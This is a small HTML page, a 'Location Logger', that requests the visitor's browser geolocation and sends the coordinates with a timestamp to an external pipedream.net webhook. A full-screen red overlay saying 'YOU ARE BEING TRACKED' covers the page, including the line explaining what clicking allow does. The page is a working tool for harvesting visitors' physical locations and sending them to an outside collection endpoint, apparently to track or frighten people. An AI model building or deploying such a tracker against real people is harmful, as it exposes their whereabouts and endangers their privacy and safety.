<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Simple Location Logger</title>
  <style>
    /* Ensure html and body fill the viewport */
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    /* Fullscreen creepy warning */
    #warning {
      position: fixed;      /* stay fixed on screen */
      top: 0;
      left: 0;
      height: 100vh;        /* full viewport height */
      width: 100vw;         /* full viewport width */
      background-color: darkred;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-size: 5vw;       /* scales with screen width */
      font-family: 'Creepster', cursive;
      text-align: center;
      z-index: 9999;        /* above everything */
    }

    /* Import creepy font */
    @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');

    h1, p {
      position: relative;
      z-index: 1;
      color: white;
      text-align: center;
    }
  </style>
</head>
<body>
  <div id="warning">
    YOU ARE BEING TRACKED
  </div>

  <h1>Location Logger</h1>
  <p>Click allow to send your coordinates</p>

  <script>
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch("https://eo6f81z4derf3yg.m.pipedream.net", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              timestamp: new Date().toISOString(),
              lat: pos.coords.latitude,
              lon: pos.coords.longitude
            })
          });
          console.log("Coords sent!");
        },
        (err) => console.error("Geo error:", err)
      );
    } else {
      console.log("Geolocation not supported");
    }
  </script>
</body>
</html>
